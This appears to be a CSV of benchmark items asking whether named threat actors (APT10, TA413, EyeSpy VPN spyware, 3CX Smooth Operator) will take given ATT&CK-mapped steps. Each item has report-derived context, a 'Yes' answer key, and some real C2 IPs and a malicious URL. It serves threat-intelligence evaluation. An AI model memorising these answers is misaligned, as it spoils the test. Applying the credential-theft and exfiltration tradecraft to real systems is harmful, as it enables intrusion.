1913,34,34-Lateral Movement-T1550-Use Alternate Authentication Material,"After conducting internal reconnaissance using common Windows tools and later stages using open-source pentesting tools, is APT10 likely to leverage shared MSP infrastructure to move laterally between MSPs and other victims and exploit systems that share access and credentials?",Lateral Movement: APT10 leverages shared MSP infrastructure to move laterally between MSPs and other victims. The actor uses systems that share access and credentials to gain access to new areas of the network.,"Initial Access: APT10, a China-based threat actor, has been observed using spear phishing emails with malicious attachments or links to compromise targets. These emails often contain decoy documents relevant to the recipient's interests, indicating significant target research. For example, an official document from the Japan Society for the Promotion of Science was weaponized and used in a campaign against the Japanese education sector.
Execution: APT10 deploys malware to establish a foothold on a target network, using tools like PlugX, RedLeaves, or Quasar RAT for long-term remote access. The actor performs internal reconnaissance using common Windows tools and open-source pentesting tools. APT10 ensures access to legitimate credentials, often using the MSPs credentials, and deploys credential theft tools such as mimikatz or PwDump. The actor installs updates and new malware on compromised systems, using methods like reverse shell or RDP connections to propagate across the network.
Persistence: APT10 achieves persistence on victim networks primarily through scheduled tasks or Windows services, ensuring malware remains active despite system reboots. The actor targets both high-value systems for access and low-profile systems less likely to draw attention for long-term access.
Privilege Escalation: APT10 uses credential theft tools to gain higher-level permissions on compromised systems. The actor has been observed using stolen MSP credentials to gain administrator or domain administrator privileges.
Defense Evasion: APT10 has evolved from using malware associated with China-based threat actors to developing bespoke in-house malware like ChChes and RedLeaves. The actor also uses open-source malware like Quasar and extends its capabilities. APT10 uses DLL search order hijacking and sideloading to execute modified versions of open-source tools.
Credential Access: APT10 deploys tools like mimikatz or PwDump to steal credentials, often using DLL load order hijacking to execute against a domain controller.
Discovery: APT10 conducts internal reconnaissance to map out the network using common Windows tools and later stages using open-source pentesting tools.
Collection: APT10 identifies systems of interest and stages data for exfiltration in multi-part archives, often placed in the Recycle Bin, using compression tools launched via remote command execution scripts.
Command and Control: APT10 uses dynamic-DNS domains for command and control infrastructure, which are highly interconnected and link back to the actor's previous operations. The actor uses legitimate Robocopy tool and Putty Secure Copy Client (PSCP) to transfer data for command and control.
Exfiltration: APT10 'pushes' data from victim networks to other networks they have access to, such as other MSP or victim networks, then 'pulls' the data to locations from which they can directly obtain it, such as the threat actor's C2 servers.
Others: APT10, a China-based threat actor, has been active since at least 2009, evolving its targeting from the US defense industrial base and technology sectors to a global compromise of multiple industries. The actor has increased its scale and capability since early 2016, adding new custom tools and significantly increasing the number of dynamic-DNS domains used for operations. APT10's activities align with China Standard Time and its targeting corresponds with strategic Chinese interests. The actor's campaigns, including Operation Cloud Hopper, have targeted managed IT service providers (MSPs) and Japanese organizations, focusing on espionage and sensitive data collection. APT10's methodology includes spear phishing, use of bespoke and open-source malware, and leveraging MSP infrastructure for lateral movement and data exfiltration.",Yes,cloud-hopper-report-final-v4
1914,34,34-Lateral Movement-T1080-Taint Shared Content,"After conducting internal reconnaissance using common Windows tools and open-source pentesting tools for discovery, is APT10 likely to leverage shared MSP infrastructure for lateral movement to gain access to new areas of the network before staging exfiltration data in multi-part archives in the Recycle Bin using compression tools?",Lateral Movement: APT10 leverages shared MSP infrastructure to move laterally between MSPs and other victims. The actor uses systems that share access and credentials to gain access to new areas of the network.,"Initial Access: APT10, a China-based threat actor, has been observed using spear phishing emails with malicious attachments or links to compromise targets. These emails often contain decoy documents relevant to the recipient's interests, indicating significant target research. For example, an official document from the Japan Society for the Promotion of Science was weaponized and used in a campaign against the Japanese education sector.
Execution: APT10 deploys malware to establish a foothold on a target network, using tools like PlugX, RedLeaves, or Quasar RAT for long-term remote access. The actor performs internal reconnaissance using common Windows tools and open-source pentesting tools. APT10 ensures access to legitimate credentials, often using the MSPs credentials, and deploys credential theft tools such as mimikatz or PwDump. The actor installs updates and new malware on compromised systems, using methods like reverse shell or RDP connections to propagate across the network.
Persistence: APT10 achieves persistence on victim networks primarily through scheduled tasks or Windows services, ensuring malware remains active despite system reboots. The actor targets both high-value systems for access and low-profile systems less likely to draw attention for long-term access.
Privilege Escalation: APT10 uses credential theft tools to gain higher-level permissions on compromised systems. The actor has been observed using stolen MSP credentials to gain administrator or domain administrator privileges.
Defense Evasion: APT10 has evolved from using malware associated with China-based threat actors to developing bespoke in-house malware like ChChes and RedLeaves. The actor also uses open-source malware like Quasar and extends its capabilities. APT10 uses DLL search order hijacking and sideloading to execute modified versions of open-source tools.
Credential Access: APT10 deploys tools like mimikatz or PwDump to steal credentials, often using DLL load order hijacking to execute against a domain controller.
Discovery: APT10 conducts internal reconnaissance to map out the network using common Windows tools and later stages using open-source pentesting tools.
Collection: APT10 identifies systems of interest and stages data for exfiltration in multi-part archives, often placed in the Recycle Bin, using compression tools launched via remote command execution scripts.
Command and Control: APT10 uses dynamic-DNS domains for command and control infrastructure, which are highly interconnected and link back to the actor's previous operations. The actor uses legitimate Robocopy tool and Putty Secure Copy Client (PSCP) to transfer data for command and control.
Exfiltration: APT10 'pushes' data from victim networks to other networks they have access to, such as other MSP or victim networks, then 'pulls' the data to locations from which they can directly obtain it, such as the threat actor's C2 servers.
Others: APT10, a China-based threat actor, has been active since at least 2009, evolving its targeting from the US defense industrial base and technology sectors to a global compromise of multiple industries. The actor has increased its scale and capability since early 2016, adding new custom tools and significantly increasing the number of dynamic-DNS domains used for operations. APT10's activities align with China Standard Time and its targeting corresponds with strategic Chinese interests. The actor's campaigns, including Operation Cloud Hopper, have targeted managed IT service providers (MSPs) and Japanese organizations, focusing on espionage and sensitive data collection. APT10's methodology includes spear phishing, use of bespoke and open-source malware, and leveraging MSP infrastructure for lateral movement and data exfiltration.",Yes,cloud-hopper-report-final-v4
1915,34,34-Command and Control-T1568-Dynamic Resolution,"After staging data for exfiltration in multi-part archives using compression tools launched via remote command execution scripts, is it likely that APT10 will use dynamic-DNS domains for command and control infrastructure by employing tools like Robocopy and Putty Secure Copy Client (PSCP)?","Command and Control: APT10 uses dynamic-DNS domains for command and control infrastructure, which are highly interconnected and link back to the actor's previous operations. The actor uses legitimate Robocopy tool and Putty Secure Copy Client (PSCP) to transfer data for command and control.","Initial Access: APT10, a China-based threat actor, has been observed using spear phishing emails with malicious attachments or links to compromise targets. These emails often contain decoy documents relevant to the recipient's interests, indicating significant target research. For example, an official document from the Japan Society for the Promotion of Science was weaponized and used in a campaign against the Japanese education sector.
Execution: APT10 deploys malware to establish a foothold on a target network, using tools like PlugX, RedLeaves, or Quasar RAT for long-term remote access. The actor performs internal reconnaissance using common Windows tools and open-source pentesting tools. APT10 ensures access to legitimate credentials, often using the MSPs credentials, and deploys credential theft tools such as mimikatz or PwDump. The actor installs updates and new malware on compromised systems, using methods like reverse shell or RDP connections to propagate across the network.
Persistence: APT10 achieves persistence on victim networks primarily through scheduled tasks or Windows services, ensuring malware remains active despite system reboots. The actor targets both high-value systems for access and low-profile systems less likely to draw attention for long-term access.
Privilege Escalation: APT10 uses credential theft tools to gain higher-level permissions on compromised systems. The actor has been observed using stolen MSP credentials to gain administrator or domain administrator privileges.
Defense Evasion: APT10 has evolved from using malware associated with China-based threat actors to developing bespoke in-house malware like ChChes and RedLeaves. The actor also uses open-source malware like Quasar and extends its capabilities. APT10 uses DLL search order hijacking and sideloading to execute modified versions of open-source tools.
Credential Access: APT10 deploys tools like mimikatz or PwDump to steal credentials, often using DLL load order hijacking to execute against a domain controller.
Discovery: APT10 conducts internal reconnaissance to map out the network using common Windows tools and later stages using open-source pentesting tools.
Lateral Movement: APT10 leverages shared MSP infrastructure to move laterally between MSPs and other victims. The actor uses systems that share access and credentials to gain access to new areas of the network.
Collection: APT10 identifies systems of interest and stages data for exfiltration in multi-part archives, often placed in the Recycle Bin, using compression tools launched via remote command execution scripts.
Exfiltration: APT10 'pushes' data from victim networks to other networks they have access to, such as other MSP or victim networks, then 'pulls' the data to locations from which they can directly obtain it, such as the threat actor's C2 servers.
Others: APT10, a China-based threat actor, has been active since at least 2009, evolving its targeting from the US defense industrial base and technology sectors to a global compromise of multiple industries. The actor has increased its scale and capability since early 2016, adding new custom tools and significantly increasing the number of dynamic-DNS domains used for operations. APT10's activities align with China Standard Time and its targeting corresponds with strategic Chinese interests. The actor's campaigns, including Operation Cloud Hopper, have targeted managed IT service providers (MSPs) and Japanese organizations, focusing on espionage and sensitive data collection. APT10's methodology includes spear phishing, use of bespoke and open-source malware, and leveraging MSP infrastructure for lateral movement and data exfiltration.",Yes,cloud-hopper-report-final-v4
1916,34,34-Collection-T1074-Data Staged,"After conducting internal reconnaissance to map out the network and utilizing tools like mimikatz or PwDump for credential theft, is APT10 likely to identify systems of interest, stage data in multi-part archives, and place them in the Recycle Bin before exfiltrating the data to other MSP or victim networks and then to their C2 servers?","Collection: APT10 identifies systems of interest and stages data for exfiltration in multi-part archives, often placed in the Recycle Bin, using compression tools launched via remote command execution scripts.","Initial Access: APT10, a China-based threat actor, has been observed using spear phishing emails with malicious attachments or links to compromise targets. These emails often contain decoy documents relevant to the recipient's interests, indicating significant target research. For example, an official document from the Japan Society for the Promotion of Science was weaponized and used in a campaign against the Japanese education sector.
Execution: APT10 deploys malware to establish a foothold on a target network, using tools like PlugX, RedLeaves, or Quasar RAT for long-term remote access. The actor performs internal reconnaissance using common Windows tools and open-source pentesting tools. APT10 ensures access to legitimate credentials, often using the MSPs credentials, and deploys credential theft tools such as mimikatz or PwDump. The actor installs updates and new malware on compromised systems, using methods like reverse shell or RDP connections to propagate across the network.
Persistence: APT10 achieves persistence on victim networks primarily through scheduled tasks or Windows services, ensuring malware remains active despite system reboots. The actor targets both high-value systems for access and low-profile systems less likely to draw attention for long-term access.
Privilege Escalation: APT10 uses credential theft tools to gain higher-level permissions on compromised systems. The actor has been observed using stolen MSP credentials to gain administrator or domain administrator privileges.
Defense Evasion: APT10 has evolved from using malware associated with China-based threat actors to developing bespoke in-house malware like ChChes and RedLeaves. The actor also uses open-source malware like Quasar and extends its capabilities. APT10 uses DLL search order hijacking and sideloading to execute modified versions of open-source tools.
Credential Access: APT10 deploys tools like mimikatz or PwDump to steal credentials, often using DLL load order hijacking to execute against a domain controller.
Discovery: APT10 conducts internal reconnaissance to map out the network using common Windows tools and later stages using open-source pentesting tools.
Lateral Movement: APT10 leverages shared MSP infrastructure to move laterally between MSPs and other victims. The actor uses systems that share access and credentials to gain access to new areas of the network.
Command and Control: APT10 uses dynamic-DNS domains for command and control infrastructure, which are highly interconnected and link back to the actor's previous operations. The actor uses legitimate Robocopy tool and Putty Secure Copy Client (PSCP) to transfer data for command and control.
Exfiltration: APT10 'pushes' data from victim networks to other networks they have access to, such as other MSP or victim networks, then 'pulls' the data to locations from which they can directly obtain it, such as the threat actor's C2 servers.
Others: APT10, a China-based threat actor, has been active since at least 2009, evolving its targeting from the US defense industrial base and technology sectors to a global compromise of multiple industries. The actor has increased its scale and capability since early 2016, adding new custom tools and significantly increasing the number of dynamic-DNS domains used for operations. APT10's activities align with China Standard Time and its targeting corresponds with strategic Chinese interests. The actor's campaigns, including Operation Cloud Hopper, have targeted managed IT service providers (MSPs) and Japanese organizations, focusing on espionage and sensitive data collection. APT10's methodology includes spear phishing, use of bespoke and open-source malware, and leveraging MSP infrastructure for lateral movement and data exfiltration.",Yes,cloud-hopper-report-final-v4
1917,34,34-Collection-T1560-Archive Collected Data,"After conducting internal reconnaissance to map out the network using common Windows tools and open-source pentesting tools, is it likely that APT10 will identify systems of interest and use remote command execution scripts to launch compression tools for staging data in multi-part archives?","Collection: APT10 identifies systems of interest and stages data for exfiltration in multi-part archives, often placed in the Recycle Bin, using compression tools launched via remote command execution scripts.","Initial Access: APT10, a China-based threat actor, has been observed using spear phishing emails with malicious attachments or links to compromise targets. These emails often contain decoy documents relevant to the recipient's interests, indicating significant target research. For example, an official document from the Japan Society for the Promotion of Science was weaponized and used in a campaign against the Japanese education sector.
Execution: APT10 deploys malware to establish a foothold on a target network, using tools like PlugX, RedLeaves, or Quasar RAT for long-term remote access. The actor performs internal reconnaissance using common Windows tools and open-source pentesting tools. APT10 ensures access to legitimate credentials, often using the MSPs credentials, and deploys credential theft tools such as mimikatz or PwDump. The actor installs updates and new malware on compromised systems, using methods like reverse shell or RDP connections to propagate across the network.
Persistence: APT10 achieves persistence on victim networks primarily through scheduled tasks or Windows services, ensuring malware remains active despite system reboots. The actor targets both high-value systems for access and low-profile systems less likely to draw attention for long-term access.
Privilege Escalation: APT10 uses credential theft tools to gain higher-level permissions on compromised systems. The actor has been observed using stolen MSP credentials to gain administrator or domain administrator privileges.
Defense Evasion: APT10 has evolved from using malware associated with China-based threat actors to developing bespoke in-house malware like ChChes and RedLeaves. The actor also uses open-source malware like Quasar and extends its capabilities. APT10 uses DLL search order hijacking and sideloading to execute modified versions of open-source tools.
Credential Access: APT10 deploys tools like mimikatz or PwDump to steal credentials, often using DLL load order hijacking to execute against a domain controller.
Discovery: APT10 conducts internal reconnaissance to map out the network using common Windows tools and later stages using open-source pentesting tools.
Lateral Movement: APT10 leverages shared MSP infrastructure to move laterally between MSPs and other victims. The actor uses systems that share access and credentials to gain access to new areas of the network.
Command and Control: APT10 uses dynamic-DNS domains for command and control infrastructure, which are highly interconnected and link back to the actor's previous operations. The actor uses legitimate Robocopy tool and Putty Secure Copy Client (PSCP) to transfer data for command and control.
Exfiltration: APT10 'pushes' data from victim networks to other networks they have access to, such as other MSP or victim networks, then 'pulls' the data to locations from which they can directly obtain it, such as the threat actor's C2 servers.
Others: APT10, a China-based threat actor, has been active since at least 2009, evolving its targeting from the US defense industrial base and technology sectors to a global compromise of multiple industries. The actor has increased its scale and capability since early 2016, adding new custom tools and significantly increasing the number of dynamic-DNS domains used for operations. APT10's activities align with China Standard Time and its targeting corresponds with strategic Chinese interests. The actor's campaigns, including Operation Cloud Hopper, have targeted managed IT service providers (MSPs) and Japanese organizations, focusing on espionage and sensitive data collection. APT10's methodology includes spear phishing, use of bespoke and open-source malware, and leveraging MSP infrastructure for lateral movement and data exfiltration.",Yes,cloud-hopper-report-final-v4
1922,340,340-Command and Control-T1071-Application Layer Protocol,"After executing phishing emails impersonating the 'Tibetan Women's Association' to deliver the FriarFox malicious browser extension for initial access, is it likely that the threat actors will use this extension to contact a command and control server and then retrieve the Scanbox payload?","Command and Control: After installing the FriarFox extension, the threat actors gain control over the user's Gmail account and Firefox browser. The extension contacts a command and control server to retrieve the Scanbox payload, which is capable of tracking visitors, performing keylogging, and collecting user data.","Initial Access: In late January 2021, a phishing email targeting Tibetan organizations was detected, impersonating the 'Tibetan Women's Association' and originating from a known TA413 Gmail account. The email contained a malicious URL (hxxps://you-tube[.]tv) leading to a fake 'Adobe Flash Player Update' themed landing page, which executed JavaScript files to profile the user's system and determine the delivery of the 'FriarFox' malicious Firefox browser extension.
Defense Evasion: The FriarFox browser extension, once installed, allows threat actors to gain access to the user's Gmail account and Firefox browser data. It also contacts a command and control server to retrieve the PHP and JS-based payload Scanbox. The extension is designed to search, archive, read, label, mark as spam, delete, refresh, forward emails, and perform function searches in Gmail, as well as access user data for all websites, display notifications, and modify privacy settings in Firefox.
Others: The FriarFox browser extension is based on the open-source tool 'Gmail Notifier (restartless)' and has been altered by TA413 to include malicious functionality and conceal its presence. TA413 has also used the Scanbox framework since at least June 2020 and has been linked to watering hole attacks targeting Tibetan organizations in 2019. The campaign leverages the legitimate domain Tibet[.]net as a decoy and delivers Scanbox via the malicious browser extension. TA413's campaigns have also used COVID-19 and self-immolation themed lures to deliver Sepulcher malware via malicious RTF files. Despite public disclosures, TA413 has not made significant operational changes and is expected to continue targeting the Tibetan Diaspora.",Yes,proofpoint.com-TA413 Leverages New FriarFox Browser Extension to Target the Gmail Accounts of Global Tibetan Organiz
1923,341,341-Command and Control-T1105-Ingress Tool Transfer,"After using libchrome.exe to query Google Chrome's SQLite databases for credentials as part of Credential Access, is it likely that the spyware would leverage C2 servers hosted on Novinhost for Command and Control activities, using IP addresses related to initial execution flow and additional payloads?","Command and Control: The C2 servers belong to SecondEye and are hosted on Novinhost. The IP used by the initial execution flow is 213.232.124.157, and the other IP used by the additional payloads is 94.130.247.148. The servers are not always running, and the malware uses curl.exe to access the FTP servers.","Initial Access: During routine analysis, Bitdefender researchers discovered that the initial access to infected systems was primarily through an installer named 20SPEED-VPN-v9.2.exe, which contained components of the SecondEye monitoring application. This installer was not recognized as a valid InnoSetup executable, indicating it was a different type of installer, possibly Smart Install Maker. The installer placed spyware components in the %LOCALAPPDATA%\Microsoft\WindowsApps directory and launched the first stage of the spyware, sysCrt32.exe, along with a legitimate InnoSetup installer for the VPN software located in the %TEMP% folder.
Execution: The execution flow begins with sysCrt32.exe, which ensures persistence and adds the WindowsApps folder to the %PATH% environment variable. It then executes various batch files for initialization and sets up scheduled tasks to run sysBus32.exe every 3 hours. sysBus32.exe is responsible for downloading and executing the second stage from the C2 server. Other executables like libCache32.exe, libTemp32.exe, and libchrome.exe are also part of the execution process, performing keylogging, clipboard logging, and Chrome password extraction, respectively.
Persistence: The spyware establishes persistence by adding the WindowsApps folder to the %PATH% environment variable and setting up scheduled tasks to run sysBus32.exe every 3 hours. sysCrt32.exe checks for the presence of the folder in the environment variables and the scheduled task, and if not found, calls scripts to add them.
Credential Access: The spyware components include libchrome.exe, which queries Google Chrome's SQLite databases to log usernames and passwords. It uses stolen tokens from Local State and Login Data files to decrypt the stored passwords.
Collection: The collection process involves sysOptimizer.bat, which collects and archives personal files from the infected system, including files from the Firefox directory and various file types from potential personal data folders. libCache32.exe and libTemp32.exe are also involved in the collection process, performing keylogging and clipboard content logging.
Exfiltration: The exfiltration process is handled by sysUp32.bat, which collects all files created by the components and uploads them to the FTP server. It also exfiltrates Chrome passwords and crypto-wallet data for various applications.
Others: The campaign distribution indicates a growing number of detections in the past 6 months, particularly in Iran, as individuals seek VPN access to the internet. Bitdefender protects against this threat by detecting the malicious installer and blocking the process that initializes the spyware. The malicious executables from the second stage are also detected, and existing infections are identified by detecting the persistence process. The article recommends using well-known VPN solutions from legitimate sources and a security solution like Bitdefender to protect against information stealers.",Yes,Bitdefender-PR-Whitepaper-EyeSpyVPN-creat625-en-EN
1924,341,341-Execution-T1053-Scheduled Task/Job,"After achieving initial access by placing spyware components in the %LOCALAPPDATA%\Microsoft\WindowsApps directory and launching sysCrt32.exe, is it likely that the spyware will use batch files for initialization and set up scheduled tasks to run sysBus32.exe every 3 hours before establishing persistence by ensuring the WindowsApps folder is added to the %PATH% environment variable?","Execution: The execution flow begins with sysCrt32.exe, which ensures persistence and adds the WindowsApps folder to the %PATH% environment variable. It then executes various batch files for initialization and sets up scheduled tasks to run sysBus32.exe every 3 hours. sysBus32.exe is responsible for downloading and executing the second stage from the C2 server. Other executables like libCache32.exe, libTemp32.exe, and libchrome.exe are also part of the execution process, performing keylogging, clipboard logging, and Chrome password extraction, respectively.","Initial Access: During routine analysis, Bitdefender researchers discovered that the initial access to infected systems was primarily through an installer named 20SPEED-VPN-v9.2.exe, which contained components of the SecondEye monitoring application. This installer was not recognized as a valid InnoSetup executable, indicating it was a different type of installer, possibly Smart Install Maker. The installer placed spyware components in the %LOCALAPPDATA%\Microsoft\WindowsApps directory and launched the first stage of the spyware, sysCrt32.exe, along with a legitimate InnoSetup installer for the VPN software located in the %TEMP% folder.
Persistence: The spyware establishes persistence by adding the WindowsApps folder to the %PATH% environment variable and setting up scheduled tasks to run sysBus32.exe every 3 hours. sysCrt32.exe checks for the presence of the folder in the environment variables and the scheduled task, and if not found, calls scripts to add them.
Credential Access: The spyware components include libchrome.exe, which queries Google Chrome's SQLite databases to log usernames and passwords. It uses stolen tokens from Local State and Login Data files to decrypt the stored passwords.
Collection: The collection process involves sysOptimizer.bat, which collects and archives personal files from the infected system, including files from the Firefox directory and various file types from potential personal data folders. libCache32.exe and libTemp32.exe are also involved in the collection process, performing keylogging and clipboard content logging.
Command and Control: The C2 servers belong to SecondEye and are hosted on Novinhost. The IP used by the initial execution flow is 213.232.124.157, and the other IP used by the additional payloads is 94.130.247.148. The servers are not always running, and the malware uses curl.exe to access the FTP servers.
Exfiltration: The exfiltration process is handled by sysUp32.bat, which collects all files created by the components and uploads them to the FTP server. It also exfiltrates Chrome passwords and crypto-wallet data for various applications.
Others: The campaign distribution indicates a growing number of detections in the past 6 months, particularly in Iran, as individuals seek VPN access to the internet. Bitdefender protects against this threat by detecting the malicious installer and blocking the process that initializes the spyware. The malicious executables from the second stage are also detected, and existing infections are identified by detecting the persistence process. The article recommends using well-known VPN solutions from legitimate sources and a security solution like Bitdefender to protect against information stealers.",Yes,Bitdefender-PR-Whitepaper-EyeSpyVPN-creat625-en-EN
1926,341,341-Credential Access-T1555-Credentials from Password Stores,"Before querying Google Chrome's SQLite databases to log usernames and passwords during the credential access phase, is it likely that the spyware will collect and archive personal files, keylogging data, and clipboard content during the collection phase, and set up scheduled tasks to ensure persistence by running sysBus32.exe every 3 hours?","Credential Access: The spyware components include libchrome.exe, which queries Google Chrome's SQLite databases to log usernames and passwords. It uses stolen tokens from Local State and Login Data files to decrypt the stored passwords.","Initial Access: During routine analysis, Bitdefender researchers discovered that the initial access to infected systems was primarily through an installer named 20SPEED-VPN-v9.2.exe, which contained components of the SecondEye monitoring application. This installer was not recognized as a valid InnoSetup executable, indicating it was a different type of installer, possibly Smart Install Maker. The installer placed spyware components in the %LOCALAPPDATA%\Microsoft\WindowsApps directory and launched the first stage of the spyware, sysCrt32.exe, along with a legitimate InnoSetup installer for the VPN software located in the %TEMP% folder.
Execution: The execution flow begins with sysCrt32.exe, which ensures persistence and adds the WindowsApps folder to the %PATH% environment variable. It then executes various batch files for initialization and sets up scheduled tasks to run sysBus32.exe every 3 hours. sysBus32.exe is responsible for downloading and executing the second stage from the C2 server. Other executables like libCache32.exe, libTemp32.exe, and libchrome.exe are also part of the execution process, performing keylogging, clipboard logging, and Chrome password extraction, respectively.
Persistence: The spyware establishes persistence by adding the WindowsApps folder to the %PATH% environment variable and setting up scheduled tasks to run sysBus32.exe every 3 hours. sysCrt32.exe checks for the presence of the folder in the environment variables and the scheduled task, and if not found, calls scripts to add them.
Collection: The collection process involves sysOptimizer.bat, which collects and archives personal files from the infected system, including files from the Firefox directory and various file types from potential personal data folders. libCache32.exe and libTemp32.exe are also involved in the collection process, performing keylogging and clipboard content logging.
Command and Control: The C2 servers belong to SecondEye and are hosted on Novinhost. The IP used by the initial execution flow is 213.232.124.157, and the other IP used by the additional payloads is 94.130.247.148. The servers are not always running, and the malware uses curl.exe to access the FTP servers.
Exfiltration: The exfiltration process is handled by sysUp32.bat, which collects all files created by the components and uploads them to the FTP server. It also exfiltrates Chrome passwords and crypto-wallet data for various applications.
Others: The campaign distribution indicates a growing number of detections in the past 6 months, particularly in Iran, as individuals seek VPN access to the internet. Bitdefender protects against this threat by detecting the malicious installer and blocking the process that initializes the spyware. The malicious executables from the second stage are also detected, and existing infections are identified by detecting the persistence process. The article recommends using well-known VPN solutions from legitimate sources and a security solution like Bitdefender to protect against information stealers.",Yes,Bitdefender-PR-Whitepaper-EyeSpyVPN-creat625-en-EN
1928,341,341-Collection-T1056-Input Capture,"After extracting Chrome passwords for Credential Access by querying Google Chrome's SQLite databases using libchrome.exe, is it likely that the spyware will perform keylogging for Collection using libCache32.exe?","Collection: The collection process involves sysOptimizer.bat, which collects and archives personal files from the infected system, including files from the Firefox directory and various file types from potential personal data folders. libCache32.exe and libTemp32.exe are also involved in the collection process, performing keylogging and clipboard content logging.","Initial Access: During routine analysis, Bitdefender researchers discovered that the initial access to infected systems was primarily through an installer named 20SPEED-VPN-v9.2.exe, which contained components of the SecondEye monitoring application. This installer was not recognized as a valid InnoSetup executable, indicating it was a different type of installer, possibly Smart Install Maker. The installer placed spyware components in the %LOCALAPPDATA%\Microsoft\WindowsApps directory and launched the first stage of the spyware, sysCrt32.exe, along with a legitimate InnoSetup installer for the VPN software located in the %TEMP% folder.
Execution: The execution flow begins with sysCrt32.exe, which ensures persistence and adds the WindowsApps folder to the %PATH% environment variable. It then executes various batch files for initialization and sets up scheduled tasks to run sysBus32.exe every 3 hours. sysBus32.exe is responsible for downloading and executing the second stage from the C2 server. Other executables like libCache32.exe, libTemp32.exe, and libchrome.exe are also part of the execution process, performing keylogging, clipboard logging, and Chrome password extraction, respectively.
Persistence: The spyware establishes persistence by adding the WindowsApps folder to the %PATH% environment variable and setting up scheduled tasks to run sysBus32.exe every 3 hours. sysCrt32.exe checks for the presence of the folder in the environment variables and the scheduled task, and if not found, calls scripts to add them.
Credential Access: The spyware components include libchrome.exe, which queries Google Chrome's SQLite databases to log usernames and passwords. It uses stolen tokens from Local State and Login Data files to decrypt the stored passwords.
Command and Control: The C2 servers belong to SecondEye and are hosted on Novinhost. The IP used by the initial execution flow is 213.232.124.157, and the other IP used by the additional payloads is 94.130.247.148. The servers are not always running, and the malware uses curl.exe to access the FTP servers.
Exfiltration: The exfiltration process is handled by sysUp32.bat, which collects all files created by the components and uploads them to the FTP server. It also exfiltrates Chrome passwords and crypto-wallet data for various applications.
Others: The campaign distribution indicates a growing number of detections in the past 6 months, particularly in Iran, as individuals seek VPN access to the internet. Bitdefender protects against this threat by detecting the malicious installer and blocking the process that initializes the spyware. The malicious executables from the second stage are also detected, and existing infections are identified by detecting the persistence process. The article recommends using well-known VPN solutions from legitimate sources and a security solution like Bitdefender to protect against information stealers.",Yes,Bitdefender-PR-Whitepaper-EyeSpyVPN-creat625-en-EN
1939,342,342-Collection-T1602-Data from Configuration Repository,"After collecting the OS version from the SystemVersion.plist file during discovery, is Smooth Operator likely to parse and extract domain and account name values from the 3CX file config.json during its collection stage before performing HTTPS-based communication with its C2 servers?","Collection: Smooth Operator stages collect data from the victim machine to be included in a beacon or exfiltration. It extracts the OS version, hostname, beacon interval, and C2 index, which are included in every beacon. The second-stage payload UpdateAgent parses and extracts domain and account name values from the 3CX file config.json for exfiltration.","Initial Access: Smooth Operator malware, targeting macOS, was distributed via a supply chain attack involving 3CX software. The infected software package was signed by 3CX and notarized by Apple. Malicious code was inserted into a dynamic library (dylib) within the 3CX software, which then downloads and executes a second-stage payload.
Execution: Smooth Operator malware executes as part of the 3CX software. It creates a new thread to run its functionality and uses a constructor function within the dylib to initiate without affecting the normal usage of the library.
Persistence: Smooth Operator persists by abusing a legitimate component of the 3CX software package, ensuring it runs every time the libffmpeg.dylib is loaded.
Defense Evasion: Smooth Operator employs several defense evasion techniques. The second-stage payload, UpdateAgent, daemonizes and detaches from the 3CX process. It also deletes itself from disk immediately after execution. The malware writes configuration files and executable stages to the legitimate 3CX installation directory to appear legitimate. Traffic to the C2 server is obfuscated with a custom data encoding algorithm.
Discovery: Smooth Operator collects information from the victim machine, including the OS version from the SystemVersion.plist file and domain and account name values from the 3CX file config.json. This data is included in beacons or exfiltration.
Command and Control: Smooth Operator communicates with its C2 servers over HTTPS, using a custom data encoding algorithm for obfuscation. It contains multiple C2 servers and randomly chooses a new server for each beacon. If one fails, it will try another.
Exfiltration: Smooth Operator automatically exfiltrates collected data, not over the existing C2 channel. The second-stage payload exfiltrates victim-specific data from a 3CX installation file and the victim ID generated by the first-stage via a HTTP GET request over HTTPS.
Others: Smooth Operator targets macOS and infects victims when they install specific trojanised versions of the 3CX software. It implements a file lock to ensure only one instance is running and generates a unique victim ID. The malware sleeps for 7 to 20 days before beaconing and uses a time-seeded random algorithm to generate beacon intervals. It has an embedded list of 15 C2s and one URL for the 3CX website, all obfuscated. The malware maintains a beacon error count and has taskable functionality supported by command IDs. The second-stage payload is lightweight and likely meant to determine which victims to pursue with further stages.",Yes,NCSC_MAR-Smooth-Operator
1941,342,342-Exfiltration-T1048-Exfiltration Over Alternative Protocol,"After establishing communication with its C2 servers over HTTPS and using a custom data encoding algorithm for obfuscation, is it likely that the Smooth Operator malware will automatically exfiltrate collected data via the second-stage payload using a HTTP GET request?","Exfiltration: Smooth Operator automatically exfiltrates collected data, not over the existing C2 channel. The second-stage payload exfiltrates victim-specific data from a 3CX installation file and the victim ID generated by the first-stage via a HTTP GET request over HTTPS.","Initial Access: Smooth Operator malware, targeting macOS, was distributed via a supply chain attack involving 3CX software. The infected software package was signed by 3CX and notarized by Apple. Malicious code was inserted into a dynamic library (dylib) within the 3CX software, which then downloads and executes a second-stage payload.
Execution: Smooth Operator malware executes as part of the 3CX software. It creates a new thread to run its functionality and uses a constructor function within the dylib to initiate without affecting the normal usage of the library.
Persistence: Smooth Operator persists by abusing a legitimate component of the 3CX software package, ensuring it runs every time the libffmpeg.dylib is loaded.
Defense Evasion: Smooth Operator employs several defense evasion techniques. The second-stage payload, UpdateAgent, daemonizes and detaches from the 3CX process. It also deletes itself from disk immediately after execution. The malware writes configuration files and executable stages to the legitimate 3CX installation directory to appear legitimate. Traffic to the C2 server is obfuscated with a custom data encoding algorithm.
Discovery: Smooth Operator collects information from the victim machine, including the OS version from the SystemVersion.plist file and domain and account name values from the 3CX file config.json. This data is included in beacons or exfiltration.
Collection: Smooth Operator stages collect data from the victim machine to be included in a beacon or exfiltration. It extracts the OS version, hostname, beacon interval, and C2 index, which are included in every beacon. The second-stage payload UpdateAgent parses and extracts domain and account name values from the 3CX file config.json for exfiltration.
Command and Control: Smooth Operator communicates with its C2 servers over HTTPS, using a custom data encoding algorithm for obfuscation. It contains multiple C2 servers and randomly chooses a new server for each beacon. If one fails, it will try another.
Others: Smooth Operator targets macOS and infects victims when they install specific trojanised versions of the 3CX software. It implements a file lock to ensure only one instance is running and generates a unique victim ID. The malware sleeps for 7 to 20 days before beaconing and uses a time-seeded random algorithm to generate beacon intervals. It has an embedded list of 15 C2s and one URL for the 3CX website, all obfuscated. The malware maintains a beacon error count and has taskable functionality supported by command IDs. The second-stage payload is lightweight and likely meant to determine which victims to pursue with further stages.",Yes,NCSC_MAR-Smooth-Operator
